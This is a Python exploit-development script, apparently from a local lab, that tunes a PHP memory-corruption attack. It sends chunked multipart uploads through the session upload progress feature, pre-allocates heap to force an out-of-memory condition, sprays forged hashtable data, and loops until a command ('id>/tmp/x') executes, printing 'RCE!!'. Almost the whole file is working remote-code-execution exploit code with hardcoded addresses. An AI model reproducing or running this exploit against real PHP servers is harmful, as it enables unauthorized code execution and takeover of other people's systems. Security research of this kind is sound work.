#!/usr/bin/env python3
"""test_prearm.py — force a LOW (~16MB) OOM point on the 128M stock worker by pre-allocating
~110MB EARLIER in the arming body, so _big() only has ~16-18MB headroom before memory_limit.
This should replicate alv's working OOM landing and let stage-3 reclaim align on stock."""
import argparse, subprocess, sys, time
sys.path.insert(0, "/Users/bill/php2shell/lab")
sys.path.insert(0, "/Users/bill/php2shell/alvaro")
import exploit as alv          # noqa: E402
import exploit_stock           # noqa: F401,E402  (chunked-TE + big-_big overrides)

CHUNK = 0x7ffffe000000
ap = argparse.ArgumentParser()
ap.add_argument("--url", default="http://localhost:18110/index.php")
ap.add_argument("--container", default="p2s")
ap.add_argument("--prearm-mb", type=int, default=110)   # pre-field size (MB) before _big()
ap.add_argument("--big-mb", type=int, default=40)       # _big() size (will OOM ~16-18M in)
a = ap.parse_args()

t = alv.Target(a.url, timeout=200)
ex = alv.Exploit(t, "id>/tmp/x", 0x5996e0, 0x7b47a0, htdata=0x7e0d8, huge_mb=a.big_mb)

def clear_proof():
    subprocess.run(["docker", "exec", a.container, "sh", "-c", "rm -f /tmp/x"], capture_output=True)
def proof():
    return subprocess.run(["docker", "exec", a.container, "cat", "/tmp/x"], capture_output=True, text=True).stdout.strip()

# arming that pre-allocates ~prearm_mb BEFORE session-init/_big(), so _big() OOMs at low point
def prearm():
    parts = [{"name": "PHPSESSID", "data": b"a" * 100}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"ppp"}]
    for i in range(107):
        parts.append({"name": (f"p{i:06d}")[:7], "data": b"V" * 1})
    # PRE-FIELD: large value field placed BEFORE _file() so it eats heap first
    parts.insert(2, {"name": "pre", "data": b"P" * (a.prearm_mb * 1024 * 1024)})
    parts += [ex._file(), ex._big()]   # _file() triggers session init; _big() OOMs at low point
    t.post_chunked(alv.multipart(parts, b"S" * 17), b"S" * 17, timeout=200)
    time.sleep(0.4)

def send_exploit(htdata):
    ht = ex._fake_ht(htdata); live = ex._live_ref(htdata)
    parts = [{"name": "PHPSESSID", "data": b"a" * 100}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(8): parts.append({"name": "m%04d" % i, "data": b"M" * 100})
    for i in range(80): parts.append({"name": (f"F{i:030d}")[:31], "data": b"z"})
    for i in range(200): parts.append({"name": "r%04d" % i, "data": live})
    parts.append({"name": (f"a{0:030d}")[:31], "data": ht})
    return t.post(alv.multipart(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=40)

for att in range(1, 6):
    clear_proof(); time.sleep(0.2)
    prearm()
    resp = send_exploit(0x7e0d8)
    time.sleep(0.8)
    p = proof()
    print(f"[prearm attempt {att}] {'RCE!! ' + repr(p) if p else 'no rce'}  (resp {len(resp)}B)")
    if p:
        break
